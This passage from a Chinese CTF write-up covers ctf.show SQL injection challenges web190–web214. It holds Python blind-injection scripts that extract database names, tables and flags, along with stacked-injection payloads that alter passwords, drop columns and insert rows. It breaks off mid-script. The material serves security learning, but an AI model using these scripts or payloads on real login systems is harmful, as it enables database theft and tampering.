</span></span><span class=line><span class=cl>                 <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u5bc6</span><span class=se>\\</span><span class=s2>u7801</span><span class=se>\\</span><span class=s2>u9519</span><span class=se>\\</span><span class=s2>u8bef&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这个脚本写了特别久，因为每次注出来之后他就不往里面加，陷入了一个死循环，后面我把第二个while的条件改了一下才出来的，真得<strong>随机应变</strong>啊</p><h2 id=web191>web191</h2><p>用ord绕过，整个数据库都没变</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://d50e11ca-112a-4b1c-bb8f-6ff147554e84.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span> <span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>tail</span><span class=o>+</span><span class=n>head</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;admin&#39;and (ord(substr((select database()),{0},1))&lt;{1})#&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_web</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and (ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),{0},1))&lt;{1})#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_fl0g,ctfshow_user</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and (ord(substr((select group_concat(column_name)from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;),{0},1))&lt;{1})#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id, f1ag</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;admin&#39;and (ord(substr((select f1ag from ctfshow_fl0g),</span><span class=si>{0}</span><span class=s2>,1))&lt;</span><span class=si>{1}</span><span class=s2>)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                 <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u5bc6</span><span class=se>\\</span><span class=s2>u7801</span><span class=se>\\</span><span class=s2>u9519</span><span class=se>\\</span><span class=s2>u8bef&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web192>web192</h2><p>没有ord了，用<code>chr</code>来绕过，只不过好像需要小写字符，而且因为是二分法，<code>_</code>的ascii字符是<code>95</code>，就很容易跳过，不过自己手动换一下就好了，如果硬要识别出来就要遍历了，那样子不够快</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 二分法</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://e3ca5daa-7fec-4bfa-9d2f-7282f1dbda31.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span> <span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>tail</span><span class=o>+</span><span class=n>head</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;admin&#39;and ((substr((select database()),{0},1))&lt;chr({1}))#&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_web</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and ((substr((select group_concat(table_name)from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),{0},1))&lt;chr({1}))#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_fl0g,ctfshow_user</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and ((substr((select group_concat(column_name)from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;),{0},1))&lt;chr({1}))#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id, f1ag</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;admin&#39;and ((substr((select f1ag from ctfshow_fl0g),</span><span class=si>{0}</span><span class=s2>,1))&lt;chr(</span><span class=si>{1}</span><span class=s2>))#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                 <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u5bc6</span><span class=se>\\</span><span class=s2>u7801</span><span class=se>\\</span><span class=s2>u9519</span><span class=se>\\</span><span class=s2>u8bef&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 遍历</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://e3ca5daa-7fec-4bfa-9d2f-7282f1dbda31.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>head</span><span class=p>,</span><span class=n>tail</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span><span class=o>=</span><span class=s2>&#34;admin&#39;and ((substr((select database()),</span><span class=si>{0}</span><span class=s2>,1))=chr(</span><span class=si>{1}</span><span class=s2>))#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_web</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and ((substr((select group_concat(table_name)from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),{0},1))=chr({1}))#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, j)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_fl0g,ctfshow_user</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and ((substr((select group_concat(column_name)from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;),{0},1))=chr({1}))#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, j)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id, f1ag</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and ((substr((select f1ag from ctfshow_fl0g),{0},1))=chr({1}))#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#          i, j)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u5bc6</span><span class=se>\\</span><span class=s2>u7801</span><span class=se>\\</span><span class=s2>u9519</span><span class=se>\\</span><span class=s2>u8bef&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web193194>web193\194</h2><p><code>substr</code>被过滤了，<code>like</code>和<code>%</code>来绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s1>&#39;http://93cacefa-296a-4488-87b6-4d9960e2804a.challenge.ctf.show/api/&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyz0123456789-,</span><span class=si>{}</span><span class=s1>_&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;admin&#39;and (select database())like &#39;{}&#39;#&#34;.format(target+j+&#39;%&#39;)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_web</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and (select group_concat(table_name)from information_schema.tables where table_schema=&#39;ctfshow_web&#39;)like &#39;{}&#39;#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     target + j + &#39;%&#39;)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flxg,ctfshow_user</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;admin&#39;and (select group_concat(column_name)from information_schema.columns where table_name=&#39;ctfshow_flxg&#39;)like &#39;{}&#39;#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     target + j + &#39;%&#39;)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,f1ag</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;admin&#39;and (select f1ag from ctfshow_flxg)like &#39;</span><span class=si>{}</span><span class=s2>&#39;#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+</span> <span class=n>j</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;username&#39;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;password&#39;</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u5bc6</span><span class=se>\\</span><span class=s2>u7801</span><span class=se>\\</span><span class=s2>u9519</span><span class=se>\\</span><span class=s2>u8bef&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span><span class=o>+=</span><span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web195>web195</h2><p>直接闭合打堆叠注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>0</span><span class=p>;</span><span class=k>update</span><span class=o>`</span><span class=n>ctfshow_user</span><span class=o>`</span><span class=k>set</span><span class=o>`</span><span class=n>pass</span><span class=o>`=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web196>web196</h2><p>限制了字符长度为16，还是可以堆叠注入，<code>select(1)</code>回显肯定会1，如果注入的话，那服务器查到的密码也为1，那么我们就可以拿到flag了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>0</span><span class=p>;</span><span class=k>select</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web197web200>web197–web200</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>0</span><span class=p>;</span><span class=k>show</span><span class=w> </span><span class=n>tables</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>原理一样的，密码就是表名，表名已知</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>0</span><span class=p>;</span><span class=k>alter</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=k>drop</span><span class=w> </span><span class=n>pass</span><span class=p>;</span><span class=k>alter</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=k>add</span><span class=w> </span><span class=n>pass</span><span class=w> </span><span class=nb>int</span><span class=w> </span><span class=k>default</span><span class=w> </span><span class=mi>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>0</span><span class=p>;</span><span class=k>insert</span><span class=w> </span><span class=n>ctfshow_user</span><span class=p>(</span><span class=o>`</span><span class=n>username</span><span class=o>`</span><span class=p>,</span><span class=o>`</span><span class=n>pass</span><span class=o>`</span><span class=p>)</span><span class=w> </span><span class=n>value</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>如果修改数据的话，确实是会报密码错误，但是还是成功修改了</p><h2 id=web214>web214</h2><p>参数根本拿不到，也没说，问了一下群友，知道一个工具拿来用用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pip3 install arjun
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>arjun -u http://53f33753-1c7d-4c6b-94e9-8a52d19c9b97.challenge.ctf.show/api -m POST
</span></span></code></pre></td></tr></table></div></div><p>搞不出来，F12找到<code>select.js</code>才知道参数，写个脚本，然后卡了一个小时，发现我今天Windows有点问题，这个账我要算到PYCC头上，傻逼比赛，后面发现是我代理问题，延迟高了也影响了，确实满足时间盲注的特点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://58298b04-11de-449f-b7a0-aab7810ed179.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span><span class=o>=</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
